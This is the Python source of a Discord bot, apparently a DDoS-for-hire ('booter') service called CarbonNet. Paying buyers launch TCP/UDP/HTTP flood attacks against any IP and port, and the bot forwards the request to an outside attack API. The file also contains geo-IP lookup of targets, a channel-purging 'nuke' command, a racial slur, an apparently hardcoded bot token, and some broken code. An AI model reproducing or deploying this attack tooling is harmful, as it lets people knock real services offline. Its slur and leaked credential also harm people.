import discord, datetime, time
from discord import client
from discord.ext import commands
from discord.ext.commands import has_role, cooldown, BucketType
import json
import requests
from datetime import time
from webserver import keep_alive #remove this if u're not in replit
import paramiko
import aiohttp
import os
import requests
import asyncio

WEBHOOK_URL = os.environ.get('WEBHOOK_URL')

client = discord.Client()
client = commands.Bot(command_prefix="-", intents=discord.Intents().all())
r = requests
embeds = discord.Embed
client.remove_command('help')


by = [710660621120831559, 721729999287353385, 992225208213704764]
admins = [710660621120831559]
owners = [710660621120831559]

Methods = ['TCP','UDP','HTTP']

Carbon = 'https://share.creavite.co/R99knwvpv49U2rzx.gif'

BotAccess = 1008515260128448787 #BOT ACCESS ROLE


@client.event
async def on_ready():
    activity = discord.Game(name="[ L7 & L4 BOT STRESS TEST ]", type=1)
    await client.change_presence(status=discord.Status.idle, activity=activity)
    print('All Is Ready')


@client.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandOnCooldown):  #checks if on cooldown
        msg = '>  **Still on cooldown**, please try again in {:.2f}s'.format(
            error.retry_after)
        await ctx.reply(msg)
    if isinstance(error, commands.CommandNotFound):
        embed = discord.Embed(
            title="**Command wasn't found, pelase try again.**",
            color=0x2F3136)
        embed.set_image(url="https://share.creavite.co/R99knwvpv49U2rzx.gif")
        embed.set_footer(text=f'Requested By {ctx.author}  ',
                         icon_url=ctx.author.avatar_url)
        await ctx.reply(embed=embed)
    if isinstance(error, commands.MissingRequiredArgument):
        embed = discord.Embed(title="**You are missing a required argument.**",
                              color=0x2F3136)
        embed.set_image(url="https://share.creavite.co/R99knwvpv49U2rzx.gif")
        embed.set_footer(text=f'Requested By {ctx.author}',
                         icon_url=ctx.author.avatar_url)
        await ctx.reply(embed=embed)
    if isinstance(error, commands.CheckFailure):
        embed = discord.Embed(title="** YOU NEED HAVE ACCESS  **",
                              color=0x2F3136)
        embed.add_field(
            name=
            ' ** HERE IS MY SERVER: **',
            value=
            ' ** https://discord.gg/HxPcQYFQyE **',
            inline=True)
        embed.set_image(url="https://share.creavite.co/R99knwvpv49U2rzx.gif")
        embed.set_footer(text=f'Requested By {ctx.author}',
                         icon_url=ctx.author.avatar_url)
        await ctx.reply(embed=embed)


@client.command()
async def ping(ctx):
    await ctx.send("Pinging ...", delete_after=0.1)
    await ctx.reply(
        f"> ** My Ping {round(client.latency * 1000)}ms**"
    )


blacklist = [
    '1.1.1.1', '73.73.73.75', '73.73.73.74', '70.70.70.7',
    'http://23.227.142.74', 'http://50.7.198.146', 'https://176.9.16.251',
    'http://88.198.8.149', 'http://85.10.197.131', 'http://85.10.195.175',
    'http://95.211.208.171', 'http://78.31.67.223', 'http://51.38.92.223',
    'http://51.15.25.108', 'http://pow.dststx.xyz/pow',
    'http://200.xflare.store', 'http://click.xflare.store',
    'http://high.xflare.store', 'https://bbos.cat', 'https://tls.mrrage.xyz',
    'https://blog.dststx.xyz', 'https://dststx.xyz', 'https://test.dststx.xyz',
    'https://dev.dststx.xyz', 'https://golem.cam/?q=%RANDOM%',
    'https://dstat.periodic.gay',
    'http://qwyhigddbo4mcnrep234hzn23ztiitkumfxclxdoahzacgtinhityyid.onion',
    'https://baloo.one', 'https://webstress.xyz', 'https://stressid.ru',
    'https://quantube.win', 'https://ddos-it.hshp.app',
    'https://ventryshield.com', 'https://famy.lol', '', '', '', '', '', '', '',
    '', '', '', '', '', '', '', '', '', '', '', ''
]#dstat blacklist system


@client.command()
@commands.cooldown(1, 100, commands.BucketType.role)
async def hold(ctx,
               method: str = None,
               host: str = None,
               port: str = None,
               times: str = None):
    if ctx.author.id not in by:
        await ctx.reply('> **Sorry, You Need To Buy Me First **')
        hold.reset_cooldown(ctx)
    elif method == None:
        embed = discord.Embed(color=0x2F3136)
        embed.add_field(
            name=' _**ATTACK**_',
            value='** We Need Method For Stress Test. **',
            inline=False)
        embed.set_image(url="https://share.creavite.co/R99knwvpv49U2rzx.gif")
        embed.set_footer(text=f'Requested By {ctx.author}',
                         icon_url=ctx.author.avatar_url)
        await ctx.reply(embed=embed)
        hold.reset_cooldown(ctx)
    elif host in blacklist:
        embed = discord.Embed(color=0x2F3136)
        embed.add_field(
            name=' _**ATTACK**_',
            value='**This Target Is Blacklisted **',
            inline=False)
        embed.set_image(url="https://share.creavite.co/R99knwvpv49U2rzx.gif")
        embed.set_footer(text=f'Requested By {ctx.author}',
                         icon_url=ctx.author.avatar_url)
        await ctx.reply(embed=embed)
        hold.reset_cooldown(ctx)
    elif host == None:
        embed = discord.Embed(color=0x2F3136)
        embed.add_field(
            name=' _**ATTACK**_',
            value='```You Need Target For Attack ```',
            inline=False)
        embed.set_image(url="https://share.creavite.co/R99knwvpv49U2rzx.gif")
        embed.set_footer(text=f'Requested By {ctx.author}',
                         icon_url=ctx.author.avatar_url)
        await ctx.reply(embed=embed)
        hold.reset_cooldown(ctx)
    elif port == None:
        embed = discord.Embed(color=0x2F3136)
        embed.add_field(name=' _**ATTACK**_',
                        value='**INVALID PORT**',
                        inline=False)
        embed.set_image(url="https://share.creavite.co/R99knwvpv49U2rzx.gif")
        embed.set_footer(text=f'Requested By {ctx.author}',
                         icon_url=ctx.author.avatar_url)
        hold.reset_cooldown(ctx)
    elif times == None:
        embed = discord.Embed(color=0x2F3136)
        embed.add_field(
            name=' _**ATTACK**_',
            value='**INVALID TIME**',
            inline=False)
        embed.set_image(url="https://share.creavite.co/R99knwvpv49U2rzx.gif")
        embed.set_footer(text=f'Requested By {ctx.author}',
                         icon_url=ctx.author.avatar_url)
        hold.reset_cooldown(ctx)
        await ctx.reply(embed=embed)
    elif int(times) > 90:#max attack time
        embed = discord.Embed(color=0x2F3136)
        embed.add_field(
            name=' _**ATTACK**_',
            value='** MSCIMUM TIME REACHED! MAX TIME IS 90**',
            inline=False)
        embed.set_image(url="https://share.creavite.co/R99knwvpv49U2rzx.gif")
        embed.set_footer(text=f'Requested By {ctx.author}',
                         icon_url=ctx.author.avatar_url)
        await ctx.reply(embed=embed)
        hold.reset_cooldown(ctx)
    elif method in Methods:
        requests.post(
            f'https://ddos.school/client/apimanagerv2.php?key=&host={host}&port={port}&time={time}&method={method}&username=nigger512'
        )
        embed = discord.Embed(
            title=
            "** SENDING ATTACK** ",
            url="https://discord.gg/HxPcQYFQyE",
            color=0x2F3136)
        embed.set_image(
            url=
            "https://cdn.discordapp.com/attachments/1008722547942100993/1009102371181318164/MQGJUtUPHFSSpe.gif"
        )
        embed.set_footer(text=f'Requested By {ctx.author}',
                         icon_url=ctx.author.avatar_url)
        await ctx.reply(embed=embed, delete_after=0.2000)
        await asyncio.sleep(0.2000)
        embed = discord.Embed(
            title=
            "** ATTACK HAS BEEN SEND TO THE HOST** ",
            url="https://discord.gg/HxPcQYFQyE",
            color=0x2F3136)
        embed.add_field(
            name='** Host**',
            value=f'``` {host} ```',
            inline=True)
        embed.add_field(name='** Port**',
                        value=f'``` {port} ```',
                        inline=True)
        embed.add_field(
            name='** Time**',
            value=f'``` {times} ```',
            inline=True)
        embed.add_field(
            name='** Method**',
            value=f'```{method}```',
            inline=True)
        embed.add_field(
            name='** Type**',
            value=f'```L4 Method```',
            inline=False)
        embed.set_image(url="https://share.creavite.co/R99knwvpv49U2rzx.gif")
        embed.set_footer(text=f'Requested By {ctx.author}',
                         icon_url=ctx.author.avatar_url)
        await ctx.reply(embed=embed)
        embed = discord.Embed(color=0x2F3136)
        embed.add_field(
            name=
            '** MESSAGE FROM SERVER MASTER**',
            value=f'```You Need To Wait 100s For Next Attack```',
            inline=True)
        embed.set_image(url="https://share.creavite.co/R99knwvpv49U2rzx.gif")
        await ctx.reply(embed=embed)
    else:
        embed = discord.Embed(color=0x2F3136)
        embed.add_field(
            name=' _**ATTACK**_',
            value='** Method wasnt found please use a different method. **',
            inline=False)
        embed.set_image(url="https://share.creavite.co/R99knwvpv49U2rzx.gif")
        embed.set_footer(text=f'Requested By {ctx.author}',
                         icon_url=ctx.author.avatar_url)
        await ctx.reply(embed=embed)


@client.command()
@commands.cooldown(1, 10, commands.BucketType.role)
async def attackres(ctx):
    if ctx.author.id not in admins:
        await ctx.reply('> **Sorry, You Are Not An Admin **')
    else:
        hold.reset_cooldown(ctx)
        embed = discord.Embed(
            title=
            "__** CarbonNet**__ ",
            url="https://discord.gg/HxPcQYFQyE",
            color=0x2F3136)
        embed.add_field(
            name=
            '** ATTACK COOLDOWN HAS BEEN RESETED**',
            value=f'```Reseted To 0s```',
            inline=False)
        embed.set_image(url="https://share.creavite.co/R99knwvpv49U2rzx.gif")
        embed.set_footer(text=f'Requested By {ctx.author}',
                         icon_url=ctx.author.avatar_url)
        await ctx.reply(embed=embed)


@client.command()
@commands.cooldown(1, 10, commands.BucketType.role)
async def help(ctx):
    embed = discord.Embed(
        title=
        "__** CarbonNet HELP COMMAND **__ ",
        url="https://discord.gg/HxPcQYFQyE",
        color=0x2F3136)
    embed.add_field(
        name='** ALL API METHODS**',
        value=f'``` -methods ```',
        inline=False)
    embed.add_field(
        name=
        '** ATTACK CMD  **',
        value=f'``` -hold ```',
        inline=True)
    embed.add_field(
        name='** ATTACK TUT**',
        value=f'``` -how ```',
        inline=True)
    embed.add_field(
        name='** GEO LOOKUP TOOL**',
        value=f'``` -geo [ IP / HOST ]```',
        inline=False)
    embed.add_field(
        name='**<:919665956400287747:1001289891365277797> REVERSE DNS LOOKUP**',
        value=f'``` -reversedns [ IP ]```',
        inline=True)
    embed.add_field(
        name='** ICM PING  **',
        value=f'``` -icmping [ IP ]```',
        inline=False)
    embed.add_field(
        name='** TCP PING**',
        value=f'``` -tcping [ IP:PORT ] ```',
        inline=True)
    embed.add_field(
        name='**<:accountcircle_8983111:1001290110198878218> YOUR PLAN INFO**',
        value=f'``` -profile ```',
        inline=False)
    embed.add_field(
        name='**<:919967085541609492:1001289933799043092> BEST L4 METHODS**',
        value=f'```POWER-OVH POWER-NFO POWER-GAME```',
        inline=False)
    embed.set_image(url="https://share.creavite.co/R99knwvpv49U2rzx.gif")
    embed.set_footer(text=f'Requested By {ctx.author}',
                     icon_url=ctx.author.avatar_url)
    await ctx.reply(embed=embed)


@client.command()
@commands.cooldown(1, 10, commands.BucketType.role)
async def methods(ctx):
    embed = discord.Embed(
        title="**CarbonNet METHODS** ",
        url="https://discord.gg/HxPcQYFQyE",
        color=0x2F3136)
    embed.add_field(
        name='** L4 METHODS **',
        value=f'**```POWER-HOME POWER-OVH POWER-NFO POWER-TCP POWER-GAME``` **',
        inline=False)
    embed.add_field(
        name='**  ONLINE SERVERS **',
        value=f'``` {servers} ```',
        inline=False)
    embed.add_field(
        name='**  SUCCESS ATTACKS **',
        value=f'``` {attacks} ```',
        inline=True)
    embed.set_footer(text=f'Requested By {ctx.author}',
                     icon_url=ctx.author.avatar_url)
    embed.set_image(url="https://share.creavite.co/R99knwvpv49U2rzx.gif")
    await ctx.reply(embed=embed)





@client.command()
async def icmping(ctx, *, ip: str = '1.1.1.1'):
    headers = {'Accept': 'application/json'}
    r = requests.get(
        f'https://check-host.net/check-ping?host={ip}&max_nodes=15',
        headers=headers).text
    host = json.loads(r)
    embed = discord.Embed(timestamp=datetime.datetime.utcnow(),
                          title="**ICMP Check Host**",
                          color=0x2F3136)
    embed.add_field(name="**Link To Report**",
                    value=host['permanent_link'],
                    inline=False)
    embed.set_image(url="https://share.creavite.co/R99knwvpv49U2rzx.gif")
    await ctx.send(embed=embed)


@client.command()
async def tcping(ctx, *, ip: str = '1.1.1.1:443'):
    headers = {'Accept': 'application/json'}
    r = requests.get(
        f'https://check-host.net/check-tcp?host={ip}&max_nodes=15',
        headers=headers).text
    host = json.loads(r)
    embed = discord.Embed(timestamp=datetime.datetime.utcnow(),
                          title="**TCP Check Host**",
                          color=0x2F3136)
    embed.add_field(name="**Link To Report**",
                    value=host['permanent_link'],
                    inline=False)
    embed.set_image(url="https://share.creavite.co/R99knwvpv49U2rzx.gif")
    await ctx.send(embed=embed)


@client.command(name='geo')
@commands.cooldown(1, 10, commands.BucketType.role)
async def GeoLookupCommand(ctx, ip):
    r = requests.get(f'https://json.geoiplookup.io/{ip}')
    ISP = r.json()['isp']
    Country = r.json()['country_name']
    City = r.json()['city']
    Continent = r.json()['continent_name']
    Region = r.json()['region']
    await ctx.send("GETTING INFO...", delete_after=0.5)
    await asyncio.sleep(0.6)
    embed = discord.Embed(color=0x2F3136)
    embed.add_field(
        name=' __**Geo Lookup**__',
        value=
        f'```• IP: {ip}``` \n```• ISP: {ISP}```\n ```• City: {City}``` \n ```• Country: {Country}```\n ```• Continent: {Continent}```\n ```• Region: {Region}``` ',
        inline=False)
    embed.set_image(url="https://share.creavite.co/R99knwvpv49U2rzx.gif")
    embed.set_footer(text=f'Requested By {ctx.author}',
                     icon_url=ctx.author.avatar_url)
    await ctx.reply(embed=embed)


@client.command()
async def nuke(ctx):
    if ctx.author.id not in owners:
        await ctx.reply('Sorry, you are not my owner')
    else:
        delete = 10000000
        await ctx.message.delete()
        await ctx.channel.purge(limit=delete)
        embed = discord.Embed(color=0x2F3136)
        embed.add_field(
            name=
            ' __** CHANNEL NUKED **__',
            value=f'```Deleted Message : 10000000 ```',
            inline=False)
        embed.set_image(url="https://share.creavite.co/R99knwvpv49U2rzx.gif")
        embed.set_footer(text=f'Requested By {ctx.author}',
                         icon_url=ctx.author.avatar_url)
        await ctx.send(embed=embed)


@client.command()
@commands.cooldown(1, 10, commands.BucketType.role)
async def reversedns(ctx, host):
    await ctx.send("GETTING INFO...", delete_after=0.5)
    await asyncio.sleep(0.6)
    rev = requests.get('https://api.hackertarget.com/reversedns/?q=' + host)
    embed = discord.Embed(
        title=
        "**REVERSE DNS LOOKUP ** ",
        url="https://discord.gg/HxPcQYFQyE",
        color=0x2F3136)
    embed.add_field(
        name=
        ' **REVERSE DNS LOOKUP RESULTS**',
        value=rev.text.replace('<br>', ' \n ```'),
        inline=False)
    embed.set_image(url="https://share.creavite.co/R99knwvpv49U2rzx.gif")
    embed.set_footer(text=f'Requested By {ctx.author}',
                     icon_url=ctx.author.avatar_url)
    await ctx.reply(embed=embed)


@client.command()
async def admin(ctx):
    if ctx.author.id not in admins:
        await ctx.reply('> **Sorry, You Are Not An Admin **')
    else:
        embed = discord.Embed(
            title=
            "**ADMIN COMMANDS **",
            url="https://discord.gg/HxPcQYFQyE",
            color=0x2F3136)
        embed.add_field(
            name=' ** ADD BUYERS **',
            value=f'```-add_buyer```',
            inline=True)
        embed.add_field(
            name=
            ' ** REMOVE BUYERS **',
            value=f'```-del_buyer```',
            inline=True)
        embed.add_field(
            name=
            ' ** RESET ATTACK COOLDOWN **',
            value=f'```-attackres```',
            inline=False)
        embed.set_image(url="https://share.creavite.co/R99knwvpv49U2rzx.gif")
        embed.set_footer(text=f'Requested By {ctx.author}',
                         icon_url=ctx.author.avatar_url)
        await ctx.reply(embed=embed)


#######################################################################################
@client.command()
async def add_admin(ctx, admin: int = None):
    if ctx.author.id not in owners:
        embed = discord.Embed(title="**Owner-only Command**",
                              description="**> You're not an owner! **",
                              color=0x2F3136)
        embed.set_image(url="https://share.creavite.co/R99knwvpv49U2rzx.gif")
        await ctx.send(embed=embed)

    elif admin in admins:
        embed = discord.Embed(
            title="**Administrator Error**",
            description=f"> **<@{admin}> is already an Admin!**",
            color=0x2F3136)
        embed.set_image(url="https://share.creavite.co/R99knwvpv49U2rzx.gif")
        await ctx.send(embed=embed)

    elif admin is None:
        embed = discord.Embed(title="**Administrator Error**",
                              description=f"**Please provide an Admins ID**",
                              color=0x2F3136)
        embed.set_image(url="https://share.creavite.co/R99knwvpv49U2rzx.gif")
        await ctx.send(embed=embed)

    else:
        admins.append(admin)
        embed = discord.Embed(
            title="**Administrator Added**",
            description=f"> **<@{admin}> has been added to the Admin list...**",
            color=0x2F3136)
        embed.set_image(url="https://share.creavite.co/R99knwvpv49U2rzx.gif")
        await ctx.send(embed=embed)


#delete an admin from the admins list
@client.command()
async def del_admin(ctx, admin: int = None):
    if ctx.author.id not in owners:
        embed = discord.Embed(title="**Owner-only Command**",
                              description="**You're not an Admin! L**",
                              color=0x2F3136)
        embed.set_image(url="https://share.creavite.co/R99knwvpv49U2rzx.gif")
        await ctx.send(embed=embed)

    elif admin not in admins:
        embed = discord.Embed(title="**admin Error**",
                              description=f"**<@{admin}> is not a admin!**",
                              color=0x2F3136)
        embed.set_image(url="https://share.creavite.co/R99knwvpv49U2rzx.gif")
        await ctx.send(embed=embed)

    elif admin is None:
        embed = discord.Embed(title="**admin Error**",
                              description="**Please provide a admin.**",
                              color=0x2F3136)
        embed.set_image(url="https://share.creavite.co/R99knwvpv49U2rzx.gif")
        await ctx.send(embed=embed)

    else:
        admins.remove(admin)
        embed = discord.Embed(
            title="**admin Removed**",
            description=
            f"**<@{admin}> has been removed from the admin list...**",
            color=0x2F3136)
        embed.set_image(url="https://share.creavite.co/R99knwvpv49U2rzx.gif")
        await ctx.send(embed=embed)


@client.command()
async def add_buyer(ctx, buyer: int = None):
    if ctx.author.id not in admins:
        embed = discord.Embed(title="**Admin-only Command**",
                              description="**You're not an Admin! **",
                              color=0x2F3136)
        embed.set_image(url="https://share.creavite.co/R99knwvpv49U2rzx.gif")
        await ctx.send(embed=embed)

    elif buyer in by:
        embed = discord.Embed(
            title="**Buyer Error**",
            description=f"**<@{buyer}> is already a buyer!**",
            color=0x2F3136)
        embed.set_image(url="https://share.creavite.co/R99knwvpv49U2rzx.gif")
        await ctx.send(embed=embed)

    elif buyer is None:
        embed = discord.Embed(title="**Buyer Error**",
                              description="**Please provide a buyer.**",
                              color=0x2F3136)
        embed.set_image(url="https://share.creavite.co/R99knwvpv49U2rzx.gif")
        await ctx.send(embed=embed)

    else:
        by.append(buyer)
        embed = discord.Embed(
            title="**Buyer Added**",
            description=f"**<@{buyer}> has been added to the Buyer list...**",
            color=0x2F3136)
        embed.set_image(url="https://share.creavite.co/R99knwvpv49U2rzx.gif")
        await ctx.send(embed=embed)


#delete a buyer from the buyers list
@client.command()
async def del_buyer(ctx, buyer: int = None):
    if ctx.author.id not in admins:
        embed = discord.Embed(title="**Admin-only Command**",
                              description="**You're not an Admin! L**",
                              color=0x2F3136)
        embed.set_image(url="https://share.creavite.co/R99knwvpv49U2rzx.gif")
        await ctx.send(embed=embed)

    elif buyer not in by:
        embed = discord.Embed(title="**Buyer Error**",
                              description=f"**<@{buyer}> is not a buyer!**",
                              color=0x2F3136)
        embed.set_image(url="https://share.creavite.co/R99knwvpv49U2rzx.gif")
        await ctx.send(embed=embed)

    elif buyer is None:
        embed = discord.Embed(title="**Buyer Error**",
                              description="**Please provide a buyer.**",
                              color=0x2F3136)
        embed.set_image(url="https://share.creavite.co/R99knwvpv49U2rzx.gif")
        await ctx.send(embed=embed)

    else:
        by.remove(buyer)
        embed = discord.Embed(
            title="**Buyer Removed**",
            description=
            f"**<@{buyer}> has been removed from the Buyer list...**",
            color=0x2F3136)
        embed.set_image(url="https://share.creavite.co/R99knwvpv49U2rzx.gif")
        await ctx.send(embed=embed)


#####


@client.command()
async def profile(ctx):
    if ctx.author.id in by:
        embed = discord.Embed(color=0x2F3136)
        embed.add_field(
            name=
            '> ** BASIC PLAN**',
            value=
            f'```ALL METHODS```\n```MAX TIME : 120s```\n```FAST SUPPORT```\n```FULL POWER```',
            inline=True)
        embed.set_image(url="https://share.creavite.co/R99knwvpv49U2rzx.gif")
        await ctx.reply(embed=embed)
    elif ctx.author.id in owners:
        embed = discord.Embed(color=0x2F3136)
        embed.add_field(
            name=
            '> ** OWNER PLAN**',
            value=
            f'```ALL METHODS```\n```MAX TIME : 300s```\n```FAST SUPPORT```\n```FULL POWER```',
            inline=True)
        embed.set_image(url="https://share.creavite.co/R99knwvpv49U2rzx.gif")
        await ctx.reply(embed=embed)
    else:
        embed = discord.Embed(color=0x2F3136)
        embed.add_field(
            name='> ** None**',
            value=f'```None```\n```None```\n```None```\n```None```',
            inline=True)
        embed.set_image(url="https://share.creavite.co/R99knwvpv49U2rzx.gif")
        await ctx.reply(embed=embed)


@client.command()
async def how(ctx):
    embed = discord.Embed(color=0x2F3136)
    embed.add_field(
        name=' **ATTACK HELP**',
        value='``` -hold <METHOD> <IP> <PORT> <TIME/MAX:120>```',
        inline=False)
    embed.set_image(url="https://share.creavite.co/R99knwvpv49U2rzx.gif")
    embed.set_footer(text=f'Requested By {ctx.author}',
                     icon_url=ctx.author.avatar_url)
    await ctx.reply(embed=embed)


@client.command()
@commands.has_permissions(kick_members=True)
@commands.guild_only()
async def kick(ctx, member: discord.Member = None, *, reason=None):
    if member == ctx.author:
        await ctx.send("you cant kick yourself")
        return
    if member is None:
        await ctx.send("mention a user")
    else:
        await member.kick(reason=reason)
        await ctx.send(f"done kicked {member}")


@client.command()
async def gulids(ctx):
    gulids = discord.Embed()
    gulids.add_field(name="**Gulids**", value=len(client.guilds))
    await ctx.send(embed=gulids)

@client.command()
async def credits(ctx):
    gulids = discord.Embed()
    gulids.add_field(name="**This Bot Developed By - !                            uFO#0001 **")
    await ctx.send(embed=gulids)

@client.command()
async def say(ctx, channel: discord.TextChannel = None, *, message=None):
    if channel is None:
        await ctx.send(f"Please Insert Channel {ctx.author.mention}")
    else:
        await channel.send(message)
        await ctx.send(f"{ctx.author.mention},Done")


@client.command()
@commands.has_permissions(ban_members=True)
@commands.bot_has_permissions(manage_channels=True)
async def mute(ctx, user: discord.Member, time: int = 15):
    '''Mute a member in the guild'''
    secs = time * 60
    for channel in ctx.guild.channels:
        if isinstance(channel, discord.TextChannel):
            await ctx.channel.set_permissions(user, send_messages=False)
        elif isinstance(channel, discord.VoiceChannel):
            await channel.set_permissions(user, connect=False)
    await ctx.send(f"{user.mention} has been muted for {time} minutes.")
    await asyncio.sleep(secs)
    for channel in ctx.guild.channels:
        if isinstance(channel, discord.TextChannel):
            await ctx.channel.set_permissions(user, send_messages=None)
        elif isinstance(channel, discord.VoiceChannel):
            await channel.set_permissions(user, connect=None)
    await ctx.send(f'{user.mention} has been unmuted from the guild.')


@client.command()
async def cs(ctx):
    bot = ctx.guild.get_member(client.user.id)
    if bot.status is discord.Status.online:
        await client.change_presence(status=discord.Status.idle)
    elif bot.status is discord.Status.idle:
        await client.change_presence(status=discord.Status.online)


@client.command()
async def avatar(ctx: commands.Context, member: discord.User = None):
    if member is None:
        member = ctx.author

    embed = discord.Embed(
        title=f"{member.name} Avatar",
        url=
        f"https://cdn.discordapp.com/avatars/{member.id}/{member.avatar}.png",
        color=0x2f3136)
    embed.set_image(url=member.avatar_url_as(format="png", size=256))
    embed.set_footer(text=f"Request by : {ctx.author}",
                     icon_url=f"{ctx.author.avatar_url}")
    await ctx.send(embed=embed)


#remove this 3 lines if u're not in replit
keep_alive()
TOKEN = os.environ.get("BOT")
client.run(MTAxNjkyNDc3Nzc1NzI5MDU2OA.G8eSoy.YbAkbnzS_HCbbHDabaUvzIru9Uz6yow6iAP6Lk)


#client.run('TOKEN')
